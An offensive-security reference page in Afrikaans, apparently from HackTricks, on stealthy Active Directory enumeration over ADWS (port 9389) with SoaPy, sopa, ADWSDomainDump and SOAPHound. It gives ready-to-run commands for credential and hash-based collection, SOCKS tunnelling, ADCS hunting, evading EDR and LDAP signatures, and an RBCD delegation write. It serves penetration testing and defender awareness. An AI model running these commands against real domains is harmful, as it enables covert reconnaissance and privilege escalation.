# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **by verstek op elke Domain Controller sedert Windows Server 2008 R2 geaktiveer** en luister op TCP **9389**.  Ten spyte van die naam is **geen HTTP betrokke nie**.  In plaas daarvan stel die diens LDAP-styl-data bloot deur ’n stapel eie .NET framing-protokolle:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer binne hierdie binêre SOAP frames ingekapsuleer is en oor ’n ongewone poort beweeg, is **enumeration deur ADWS veel minder geneig om geïnspekteer, gefiltreer of van signatures voorsien te word as klassieke LDAP/389- en 636-verkeer**.  Vir operators beteken dit:<sup>[[1]](#references)[[7]](#references)</sup>

* Meer stealthy recon – Blue teams konsentreer dikwels op LDAP queries.
* Vryheid om data van **nie-Windows hosts (Linux, macOS)** te versamel deur 9389/TCP deur ’n SOCKS proxy te tunneling.
* Dieselfde data wat jy via LDAP sou verkry (users, groups, ACLs, schema, ens.) en die vermoë om **writes** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word oor WS-Enumeration geïmplementeer: elke query begin met ’n `Enumerate`-boodskap wat die LDAP filter/attributes definieer en ’n `EnumerationContext` GUID terugstuur, gevolg deur een of meer `Pull`-boodskappe wat resultate tot by die server-defined result window stroom.<sup>[[7]](#references)</sup> Contexts verval ná ongeveer 30 minute, dus moet tooling resultate óf in bladsye verdeel óf filters opdeel (prefix queries per CN) om te voorkom dat state verlore gaan.<sup>[[8]](#references)</sup> Wanneer jy vir security descriptors vra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID` control om SACLs uit te laat; anders laat ADWS eenvoudig die `nTSecurityDescriptor`-attribute uit sy SOAP-response weg.

> NOTA: ADWS word ook deur baie RSAT GUI/PowerShell-tools gebruik, dus kan verkeer met legitieme admin-aktiwiteit vermeng word.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is ’n **volledige herimplementering van die ADWS-protokolstapel in pure Python**.  Dit skep die NBFX/NBFSE/NNS/NMF-frames byte vir byte, wat collection vanaf Unix-like systems moontlik maak sonder om aan die .NET runtime te raak.<sup>[[1]](#references)[[2]](#references)</sup>

### Sleutelkenmerke

* Ondersteun **proxying deur SOCKS** (nuttig vanaf C2 implants).
* Fynkorrelige search filters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **write**-operasies (`--set` / `--delete`).
* **BOFHound output mode** vir direkte ingestion in BloodHound.
* `--parse`-flag om timestamps / `userAccountControl` meer leesbaar te maak wanneer menslike leesbaarheid vereis word.<sup>[[2]](#references)</sup>

### Geteikende collection-flags en write-operasies

SoaPy bevat saamgestelde switches wat die mees algemene LDAP-hunting-take oor ADWS naboots: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rou `--query` / `--filter`-knoppies vir custom pulls. Kombineer dit met write primitives soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging vir geteikende Kerberoasting) en `--asrep` (verander `DONT_REQ_PREAUTH` in `userAccountControl`).<sup>[[2]](#references)</sup>

Voorbeeld van ’n geteikende SPN-hunt wat slegs `samAccountName` en `servicePrincipalName` terugstuur:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Gebruik dieselfde host/credentials om bevindings onmiddellik te weaponise: dump RBCD-capable objects met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om ’n Resource-Based Constrained Delegation-ketting op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige abuse path).

### Installasie (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Fork van `ldapdomaindump` wat LDAP queries met ADWS calls op TCP/9389 vervang om LDAP-signature hits te verminder.
* Voer 'n aanvanklike bereikbaarheidstoets op 9389 uit, tensy `--force` deurgegee word (slaan die probe oor indien port scans raserig/gefilter is).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon met 'n suksesvolle bypass in die README.<sup>[[4]](#references)</sup>

### Installasie
```bash
pipx install .
```
### Gebruik
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipiese uitvoer teken die 9389-bereikbaarheidskontrole, ADWS-bind en die begin/einde van die dump aan:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 'n praktiese kliënt vir ADWS in Golang

Net soos soapy implementeer [sopa](https://github.com/Macmod/sopa) die ADWS-protokolstack (MS-NNS + MC-NMF + SOAP) in Golang, en stel dit command-line flags bloot om ADWS-oproepe uit te voer, soos:<sup>[[5]](#references)</sup>

* **Objeksoektog en -ophaling** - `query` / `get`
* **Objeklewensiklus** - `create [user|computer|group|ou|container|custom]` en `delete`
* **Redigering van attribute** - `attr [add|replace|delete]`
* **Rekeningbestuur** - `set-password` / `change-password`
* en ander soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ens.

### Hoogtepunte van protokoltoewysing

* LDAP-styl-soektogte word uitgevoer via **WS-Enumeration** (`Enumerate` + `Pull`) met attribuutprojeksie, omvangbeheer (Base/OneLevel/Subtree) en paginering.
* Enkelobjek-ophaling gebruik **WS-Transfer** `Get`; attribuutveranderinge gebruik `Put`; verwyderings gebruik `Delete`.
* Ingeboude objekskepping gebruik **WS-Transfer ResourceFactory**; custom objects gebruik 'n **IMDA AddRequest** wat deur YAML-templates aangedryf word.
* Wagwoordbewerkings is **MS-ADCAP**-aksies (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ontdekking van metadata sonder authentication (mex)

ADWS stel WS-MetadataExchange sonder credentials bloot, wat 'n vinnige manier is om blootstelling te valideer voordat jy authenticate:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery- en Kerberos targeting-notas

Sopa kan DC's via SRV resolve indien `--dc` weggelaat word en `--domain` verskaf word. Dit doen navrae in hierdie volgorde en gebruik die teiken met die hoogste prioriteit:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operasioneel, verkies ’n DC-beheerde resolver om foute in gesegmenteerde omgewings te vermy:

* Gebruik `--dns <DC-IP>` sodat **alle** SRV/PTR/forward lookups deur die DC DNS gaan.
* Gebruik `--dns-tcp` wanneer UDP geblokkeer word of SRV-antwoorde groot is.
* Indien Kerberos geaktiveer is en `--dc` ’n IP is, voer sopa ’n **reverse PTR** uit om ’n FQDN te verkry vir korrekte SPN/KDC-teikening. Indien Kerberos nie gebruik word nie, vind geen PTR lookup plaas nie.

Voorbeeld (IP + Kerberos, DNS deur die DC afgedwing):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opsies vir auth-materiaal

Benewens plaintext-wagwoorde ondersteun sopa **NT hashes**, **Kerberos AES keys**, **ccache** en **PKINIT certificates** (PFX of PEM) vir ADWS auth. Kerberos word geïmpliseer wanneer `--aes-key`, `-c` (ccache) of certificate-based options gebruik word.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Pasgemaakte objectskepping via templates

Vir arbitrêre objectklasse gebruik die `create custom`-command ’n YAML-template wat na ’n IMDA `AddRequest` karteer:<sup>[[5]](#references)</sup>

* `parentDN` en `rdn` definieer die houer en relatiewe DN.
* `attributes[].name` ondersteun `cn` of namespaced `addata:cn`.
* `attributes[].type` aanvaar `string|int|bool|base64|hex` of eksplisiete `xsd:*`.
* Moet nie `ad:relativeDistinguishedName` of `ad:container-hierarchy-parent` insluit nie; sopa voeg dit in.
* `hex`-waardes word na `xsd:base64Binary` omgeskakel; gebruik `value: ""` om leë stringe te stel.

## SOAPHound – Hoëvolume ADWS-versameling (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is ’n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-versoenbare JSON uitstuur. Dit bou eenmalig ’n volledige cache van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` (`--buildcache`), en hergebruik dit daarna vir hoëvolume-`--bhdump`-, `--certdump`- (ADCS) of `--dnsdump`- (AD-geïntegreerde DNS) passe, sodat slegs ongeveer 35 kritieke attributes ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) verdeel queries outomaties volgens CN-prefix om binne die 30-minute EnumerationContext-timeout in groot forests te bly.<sup>[[8]](#references)</sup>

Tipiese workflow op ’n domein-aangeslote operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON-sleuwe is direk in SharpHound/BloodHound-workflows uitgevoer—sien [BloodHound methodology](bloodhound.md) vir idees oor daaropvolgende grafiekontleding. AutoSplit maak SOAPHound veerkragtig op woude met miljoene objekte, terwyl die navraagtelling laer as ADExplorer-styl-snapshots gehou word.

## Stealth AD Collection Workflow

Die volgende workflow wys hoe om **domain- en ADCS-objekte** oor ADWS te enumereer, dit na BloodHound JSON om te skakel en vir certificate-based attack paths te soek – alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teikennetwerk na jou masjien (byvoorbeeld via Chisel, Meterpreter, SSH dynamic port-forward, ensovoorts).  Voer `export HTTPS_PROXY=socks5://127.0.0.1:1080` uit of gebruik SoaPy se `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekte uit die Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Skakel om na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP op** in die BloodHound GUI en voer Cypher-navrae soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat-escalation paths (ESC1, ESC8, ens.) bloot te lê.

### Skryf van `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir ’n volledige **Resource-Based Constrained Delegation**-ketting (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Opsomming van Tools

| Doel | Tool | Aantekeninge |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| ADWS dump met ’n hoë volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Skakel SoaPy/ldapsearch logs om |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproxy word |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client om met bekende ADWS endpoints te koppel - maak enumeration, object creation, attribute modifications en password changes moontlik |

## Verwysings

- [1] [SpecterOps – Maak seker dat jy SOAP(y) gebruik – ’n Operateursgids vir Stealthy AD Collection met ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX-, MC-NBFSE-, MS-NNS-, MC-NMF-spesifikasies](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy Enumeration van Active Directory-omgewings deur ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-tool om Active Directory-data deur ADWS te versamel](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
